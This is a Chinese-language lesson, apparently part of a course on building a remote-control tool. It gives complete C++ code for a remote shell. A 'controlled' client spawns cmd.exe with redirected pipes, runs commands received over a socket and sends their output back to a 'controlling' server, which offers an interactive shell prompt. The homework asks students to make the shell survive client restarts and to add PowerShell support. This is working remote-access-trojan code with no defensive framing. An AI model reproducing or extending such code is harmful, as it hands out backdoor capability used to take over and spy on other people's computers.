# 课时06 - 远程SHELL执行并回显

## 课程目标
1. 实现远程命令行执行功能
2. 掌握管道和进程间通信技术
3. 理解命令输出捕获和传输机制
4. 处理交互式命令和长时间运行命令

## 名词解释

| 术语 | 全称 | 解释 |
|------|------|------|
| Shell | 命令解释器 | 接收和执行命令的程序 |
| Pipe | 管道 | 进程间通信的机制 |
| STDIN/STDOUT/STDERR | 标准输入/输出/错误 | 进程的标准流 |
| Interactive | 交互式 | 需要用户输入的命令 |

## 技术原理

### 1. Shell执行架构

```
远程Shell执行流程:
1. 控制端发送Shell命令
2. 被控端创建cmd进程
3. 重定向stdin/stdout/stderr
4. 执行命令并捕获输出
5. 实时传输输出到控制端
6. 命令完成后返回结果

管道重定向:
┌─────────────┐    ┌─────────────┐
│   cmd.exe   │    │  客户端     │
│             │    │             │
│  stdin  ◄───┼────┤  输入管道    │
│  stdout ────┼────┤  输出管道    │
│  stderr ────┼────┤  错误管道    │
└─────────────┘    └─────────────┘
```

### 2. 进程创建和管道

```c
// 使用CreateProcess创建带管道的进程
STARTUPINFO si = { sizeof(STARTUPINFO) };
si.dwFlags = STARTF_USESTDHANDLES;
si.hStdInput = hInputRead;    // 读端
si.hStdOutput = hOutputWrite; // 写端
si.hStdError = hErrorWrite;   // 写端

PROCESS_INFORMATION pi;
CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
```

## 代码实现

### 1. 被控端Shell执行

```cpp
// client_shell.cpp
// 被控端Shell执行模块

#include <windows.h>
#include <stdio.h>
#include <string>
#include <thread>
#include <mutex>

#define CMD_SHELL_EXECUTE 0x3001  // 执行Shell命令
#define CMD_SHELL_OUTPUT  0x3002  // Shell输出
#define CMD_SHELL_COMPLETE 0x3003  // Shell执行完成

extern SOCKET g_sock;
extern DWORD g_clientId;

// Shell会话状态
typedef struct _SHELL_SESSION {
    HANDLE hProcess;
    HANDLE hInputWrite;
    HANDLE hOutputRead;
    HANDLE hErrorRead;
    bool isActive;
    std::thread outputThread;
    std::mutex outputMutex;
} SHELL_SESSION, *PSHELL_SESSION;

SHELL_SESSION g_shellSession = {0};

// 读取管道输出的线程函数
void ReadPipeOutput(HANDLE hRead, bool isError = false) {
    char buffer[4096];
    DWORD bytesRead;
    
    while (g_shellSession.isActive) {
        if (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
            if (bytesRead > 0) {
                buffer[bytesRead] = '\0';
                
                // 发送输出到服务端
                DWORD totalSize = sizeof(bool) + bytesRead;
                std::vector<BYTE> outputData(totalSize);
                
                // 标记是否为错误输出
                *(bool*)outputData.data() = isError;
                memcpy(outputData.data() + sizeof(bool), buffer, bytesRead);
                
                MSG_HEADER header;
                header.magic = MAGIC_NUMBER;
                header.cmdType = CMD_SHELL_OUTPUT;
                header.dataLen = totalSize;
                header.clientId = g_clientId;
                
                send(g_sock, (char*)&header, sizeof(header), 0);
                send(g_sock, (char*)outputData.data(), totalSize, 0);
            }
        } else {
            // 检查是否因为管道关闭而失败
            if (GetLastError() == ERROR_BROKEN_PIPE) {
                break;
            }
            Sleep(100);
        }
    }
}

// 初始化Shell会话
bool InitializeShell() {
    if (g_shellSession.isActive) {
        return true;
    }
    
    // 创建管道
    HANDLE hInputRead, hInputWrite;
    HANDLE hOutputRead, hOutputWrite;
    HANDLE hErrorRead, hErrorWrite;
    
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    
    // 创建stdin管道
    if (!CreatePipe(&hInputRead, &hInputWrite, &sa, 0)) {
        return false;
    }
    
    // 创建stdout管道
    if (!CreatePipe(&hOutputRead, &hOutputWrite, &sa, 0)) {
        CloseHandle(hInputRead);
        CloseHandle(hInputWrite);
        return false;
    }
    
    // 创建stderr管道
    if (!CreatePipe(&hErrorRead, &hErrorWrite, &sa, 0)) {
        CloseHandle(hInputRead);
        CloseHandle(hInputWrite);
        CloseHandle(hOutputRead);
        CloseHandle(hOutputWrite);
        return false;
    }
    
    // 设置管道缓冲区大小
    SetHandleInformation(hInputWrite, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hOutputRead, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hErrorRead, HANDLE_FLAG_INHERIT, 0);
    
    // 创建cmd进程
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hInputRead;
    si.hStdOutput = hOutputWrite;
    si.hStdError = hErrorWrite;
    
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(hInputRead);
        CloseHandle(hInputWrite);
        CloseHandle(hOutputRead);
        CloseHandle(hOutputWrite);
        CloseHandle(hErrorRead);
        CloseHandle(hErrorWrite);
        return false;
    }
    
    // 关闭不需要的句柄
    CloseHandle(hInputRead);
    CloseHandle(hOutputWrite);
    CloseHandle(hErrorWrite);
    CloseHandle(pi.hThread);
    
    // 初始化会话结构
    g_shellSession.hProcess = pi.hProcess;
    g_shellSession.hInputWrite = hInputWrite;
    g_shellSession.hOutputRead = hOutputRead;
    g_shellSession.hErrorRead = hErrorRead;
    g_shellSession.isActive = true;
    
    // 启动输出读取线程
    g_shellSession.outputThread = std::thread([&]() {
        // 同时读取stdout和stderr
        HANDLE handles[2] = {hOutputRead, hErrorRead};
        
        while (g_shellSession.isActive) {
            DWORD result = WaitForMultipleObjects(2, handles, FALSE, 100);
            
            if (result == WAIT_OBJECT_0) {
                // stdout有数据
                ReadPipeOutput(hOutputRead, false);
            } else if (result == WAIT_OBJECT_0 + 1) {
                // stderr有数据
                ReadPipeOutput(hErrorRead, true);
            } else if (result == WAIT_TIMEOUT) {
                // 检查进程是否仍在运行
                DWORD exitCode;
                if (GetExitCodeProcess(g_shellSession.hProcess, &exitCode)) {
                    if (exitCode != STILL_ACTIVE) {
                        break;
                    }
                }
            } else {
                break;
            }
        }
    });
    
    printf("[+] Shell session initialized\n");
    return true;
}

// 发送命令到Shell
bool SendShellCommand(const char* command) {
    if (!g_shellSession.isActive) {
        if (!InitializeShell()) {
            return false;
        }
    }
    
    std::string cmd = command;
    cmd += "\n";  // 添加换行符
    
    DWORD bytesWritten;
    if (!WriteFile(g_shellSession.hInputWrite, cmd.c_str(), (DWORD)cmd.length(), &bytesWritten, NULL)) {
        printf("[-] Failed to write to shell\n");
        return false;
    }
    
    return true;
}

// 处理Shell命令
bool HandleShellCommand(const char* command) {
    printf("[*] Executing shell command: %s\n", command);
    
    return SendShellCommand(command);
}

// 结束Shell会话
void TerminateShell() {
    if (!g_shellSession.isActive) {
        return;
    }
    
    g_shellSession.isActive = false;
    
    // 发送exit命令
    SendShellCommand("exit");
    
    // 等待进程结束
    WaitForSingleObject(g_shellSession.hProcess, 5000);
    
    // 关闭句柄
    CloseHandle(g_shellSession.hProcess);
    CloseHandle(g_shellSession.hInputWrite);
    CloseHandle(g_shellSession.hOutputRead);
    CloseHandle(g_shellSession.hErrorRead);
    
    // 等待输出线程结束
    if (g_shellSession.outputThread.joinable()) {
        g_shellSession.outputThread.join();
    }
    
    // 重置状态
    memset(&g_shellSession, 0, sizeof(g_shellSession));
    
    printf("[+] Shell session terminated\n");
}

// 处理来自服务端的Shell命令
bool ClientHandleShell(DWORD cmdType, const BYTE* data, DWORD dataLen) {
    switch (cmdType) {
        case CMD_SHELL_EXECUTE: {
            if (dataLen == 0) return false;
            
            std::string command((char*)data, dataLen);
            return HandleShellCommand(command.c_str());
        }
        
        case CMD_SHELL_COMPLETE: {
            TerminateShell();
            return true;
        }
    }
    
    return false;
}
```

### 2. 控制端Shell管理

```cpp
// server_shell.cpp
// 控制端Shell管理模块

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string>
#include <map>
#include <mutex>
#include <queue>
#include <thread>

#pragma comment(lib, "ws2_32.lib")

// Shell会话结构
typedef struct _SERVER_SHELL_SESSION {
    DWORD clientId;
    bool isActive;
    std::string currentOutput;
    std::mutex outputMutex;
    std::queue<std::string> commandQueue;
    bool expectingOutput;
    time_t lastActivity;
} SERVER_SHELL_SESSION, *PSERVER_SHELL_SESSION;

// 全局Shell会话管理
std::map<DWORD, SERVER_SHELL_SESSION> g_serverShells;
std::mutex g_shellMutex;

// 创建Shell会话
bool CreateServerShellSession(DWORD clientId) {
    std::lock_guard<std::mutex> lock(g_shellMutex);
    
    SERVER_SHELL_SESSION session = {0};
    session.clientId = clientId;
    session.isActive = true;
    session.expectingOutput = false;
    session.lastActivity = time(NULL);
    
    g_serverShells[clientId] = session;
    
    printf("[+] Created shell session for client %lu\n", clientId);
    return true;
}

// 发送Shell命令到客户端
bool SendShellCommandToClient(SOCKET clientSock, DWORD clientId, const char* command) {
    DWORD cmdLen = (DWORD)strlen(command);
    
    MSG_HEADER header;
    header.magic = MAGIC_NUMBER;
    header.cmdType = CMD_SHELL_EXECUTE;
    header.dataLen = cmdLen;
    header.clientId = clientId;
    
    send(clientSock, (char*)&header, sizeof(header), 0);
    send(clientSock, command, cmdLen, 0);
    
    // 更新会话状态
    {
        std::lock_guard<std::mutex> lock(g_shellMutex);
        if (g_serverShells.find(clientId) != g_serverShells.end()) {
            g_serverShells[clientId].expectingOutput = true;
            g_serverShells[clientId].lastActivity = time(NULL);
        }
    }
    
    printf("[Client %lu] Sent command: %s\n", clientId, command);
    return true;
}

// 处理Shell输出
bool HandleShellOutput(DWORD clientId, const BYTE* data, DWORD dataLen) {
    if (dataLen < sizeof(bool)) return false;
    
    bool isError = *(bool*)data;
    const char* output = (const char*)(data + sizeof(bool));
    DWORD outputLen = dataLen - sizeof(bool);
    
    std::string outputStr(output, outputLen);
    
    std::lock_guard<std::mutex> lock(g_shellMutex);
    
    if (g_serverShells.find(clientId) != g_serverShells.end()) {
        SERVER_SHELL_SESSION& session = g_serverShells[clientId];
        
        // 输出到控制台
        if (isError) {
            printf("\033[31m");  // 红色
        }
        
        printf("%s", outputStr.c_str());
        fflush(stdout);
        
        if (isError) {
            printf("\033[0m");   // 重置颜色
        }
        
        // 保存输出
        session.currentOutput += outputStr;
        session.lastActivity = time(NULL);
        session.expectingOutput = false;
    }
    
    return true;
}

// 处理Shell完成
bool HandleShellComplete(DWORD clientId) {
    std::lock_guard<std::mutex> lock(g_shellMutex);
    
    if (g_serverShells.find(clientId) != g_serverShells.end()) {
        g_serverShells[clientId].isActive = false;
        printf("\n[Client %lu] Shell session completed\n", clientId);
    }
    
    return true;
}

// 结束Shell会话
bool TerminateServerShell(SOCKET clientSock, DWORD clientId) {
    MSG_HEADER header;
    header.magic = MAGIC_NUMBER;
    header.cmdType = CMD_SHELL_COMPLETE;
    header.dataLen = 0;
    header.clientId = clientId;
    
    send(clientSock, (char*)&header, sizeof(header), 0);
    
    std::lock_guard<std::mutex> lock(g_shellMutex);
    g_serverShells.erase(clientId);
    
    printf("[Client %lu] Shell session terminated\n", clientId);
    return true;
}

// 服务端Shell处理函数
bool ServerHandleShell(SOCKET clientSock, DWORD clientId,
                      DWORD cmdType, const BYTE* data, DWORD dataLen) {
    switch (cmdType) {
        case CMD_SHELL_OUTPUT: {
            return HandleShellOutput(clientId, data, dataLen);
        }
        
        case CMD_SHELL_COMPLETE: {
            return HandleShellComplete(clientId);
        }
    }
    
    return false;
}

// Shell命令行界面
void ShellInteractiveMode(DWORD clientId, SOCKET clientSock) {
    // 创建Shell会话
    CreateServerShellSession(clientId);
    
    printf("\n=== Shell Session for Client %lu ===\n", clientId);
    printf("Type 'exit' to quit shell mode\n");
    printf("Type commands to execute remotely\n\n");
    
    char inputBuffer[1024];
    
    while (true) {
        printf("shell> ");
        fflush(stdout);
        
        if (!fgets(inputBuffer, sizeof(inputBuffer), stdin)) {
            break;
        }
        
        // 移除换行符
        inputBuffer[strcspn(inputBuffer, "\r\n")] = 0;
        
        if (strlen(inputBuffer) == 0) {
            continue;
        }
        
        // 检查退出命令
        if (strcmp(inputBuffer, "exit") == 0) {
            TerminateServerShell(clientSock, clientId);
            break;
        }
        
        // 发送命令
        SendShellCommandToClient(clientSock, clientId, inputBuffer);
        
        // 等待输出（简单实现，实际应该有更好的同步机制）
        Sleep(100);
    }
    
    printf("\n[*] Exited shell mode for client %lu\n", clientId);
}
```

### 3. 完整Shell执行示例

```cpp
// shell_example.cpp
// 完整Shell执行示例

#include <iostream>
#include <thread>
#include <chrono>

// 模拟Shell执行环境
class ShellSimulator {
private:
    bool m_isActive;
    std::string m_currentDir;
    
public:
    ShellSimulator() : m_isActive(false), m_currentDir("C:\\") {}
    
    bool Start() {
        m_isActive = true;
        printf("[Shell] Started in %s\n", m_currentDir.c_str());
        return true;
    }
    
    void ExecuteCommand(const std::string& command) {
        if (!m_isActive) return;
        
        printf("[Shell] Executing: %s\n", command.c_str());
        
        // 模拟命令执行
        if (command == "dir" || command == "ls") {
            SimulateDirCommand();
        } else if (command.substr(0, 3) == "cd ") {
            SimulateCdCommand(command.substr(3));
        } else if (command == "whoami") {
            SimulateWhoamiCommand();
        } else if (command == "ipconfig") {
            SimulateIpconfigCommand();
        } else if (command == "echo") {
            printf("ECHO is on.\r\n");
        } else if (command.substr(0, 5) == "echo ") {
            printf("%s\r\n", command.substr(5).c_str());
        } else if (command == "ver") {
            printf("Microsoft Windows [Version 10.0.19042.1237]\r\n");
        } else if (command == "exit") {
            m_isActive = false;
            printf("Exiting...\r\n");
        } else {
            printf("'%s' is not recognized as an internal or external command,\r\n", command.c_str());
            printf("operable program or batch file.\r\n");
        }
        
        if (m_isActive) {
            printf("\n%s>", m_currentDir.c_str());
            fflush(stdout);
        }
    }
    
private:
    void SimulateDirCommand() {
        printf(" Volume in drive C has no label.\r\n");
        printf(" Volume Serial Number is 1234-5678\r\n");
        printf("\r\n");
        printf(" Directory of %s\r\n", m_currentDir.c_str());
        printf("\r\n");
        printf("01/01/2022  12:00 PM    <DIR>          .\r\n");
        printf("01/01/2022  12:00 PM    <DIR>          ..\r\n");
        printf("01/01/2022  01:00 PM             1,024 test.txt\r\n");
        printf("01/01/2022  02:00 PM             2,048 data.log\r\n");
        printf("01/01/2022  03:00 PM    <DIR>          Documents\r\n");
        printf("               2 File(s)          3,072 bytes\r\n");
        printf("               3 Dir(s)  100,000,000,000 bytes free\r\n");
    }
    
    void SimulateCdCommand(const std::string& path) {
        if (path == "..") {
            size_t pos = m_currentDir.find_last_of("\\", m_currentDir.length() - 2);
            if (pos != std::string::npos) {
                m_currentDir = m_currentDir.substr(0, pos + 1);
            }
        } else if (!path.empty()) {
            if (path[0] == '\\') {
                m_currentDir = "C:" + path + "\\";
            } else {
                m_currentDir += path + "\\";
            }
        }
        printf("%s\r\n", m_currentDir.c_str());
    }
    
    void SimulateWhoamiCommand() {
        char username[256];
        DWORD size = sizeof(username);
        GetUserNameA(username, &size);
        printf("%s\\%s\r\n", "DESKTOP", username);
    }
    
    void SimulateIpconfigCommand() {
        printf("Windows IP Configuration\r\n");
        printf("\r\n");
        printf("Ethernet adapter Ethernet:\r\n");
        printf("   Connection-specific DNS Suffix  . : local.domain\r\n");
        printf("   IPv4 Address. . . . . . . . . . . : 192.168.1.100\r\n");
        printf("   Subnet Mask . . . . . . . . . . . : 255.255.255.0\r\n");
        printf("   Default Gateway . . . . . . . . . : 192.168.1.1\r\n");
    }
};

// 模拟服务端Shell处理
void SimulateServerShell() {
    printf("=== Simulated Server Shell ===\n");
    printf("Waiting for shell commands...\n");
    
    ShellSimulator simulator;
    simulator.Start();
    
    // 模拟接收和执行命令
    std::vector<std::string> testCommands = {
        "whoami",
        "dir",
        "cd Documents",
        "dir",
        "cd ..",
        "ipconfig"
    };
    
    for (const auto& cmd : testCommands) {
        printf("\n[Server] Received command: %s\n", cmd.c_str());
        simulator.ExecuteCommand(cmd);
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
    
    printf("\n[Server] Shell simulation completed\n");
}

// 模拟客户端Shell执行
void SimulateClientShell() {
    printf("=== Simulated Client Shell ===\n");
    printf("Executing shell commands remotely...\n");
    
    // 模拟命令执行和输出捕获
    std::vector<std::pair<std::string, std::string>> commandOutputs = {
        {"whoami", "DESKTOP\\user\r\n"},
        {"dir", "Directory listing output...\r\n"},
        {"ipconfig", "IP configuration output...\r\n"}
    };
    
    for (const auto& pair : commandOutputs) {
        printf("[Client] Executing: %s\n", pair.first.c_str());
        printf("[Client] Output: %s", pair.second.c_str());
        std::this_thread::sleep_for(std::chrono::milliseconds(300));
    }
    
    printf("[Client] Shell execution completed\n");
}

int main() {
    printf("========================================\n");
    printf("     Remote Shell Execution Simulation    \n");
    printf("========================================\n\n");
    
    // 启动模拟服务端线程
    std::thread serverThread(SimulateServerShell);
    
    // 稍微延迟后启动客户端
    std::this_thread::sleep_for(std::chrono::milliseconds(100));
    SimulateClientShell();
    
    // 等待服务端完成
    serverThread.join();
    
    printf("\n[*] Remote shell execution simulation completed\n");
    
    return 0;
}
```

## 课后作业

### 作业1：实现持久化Shell
让Shell会话在客户端重启后仍然保持。

### 作业2：添加命令历史记录
实现命令历史记录和上下键导航功能。

### 作业3：支持PowerShell执行
扩展支持PowerShell命令执行。
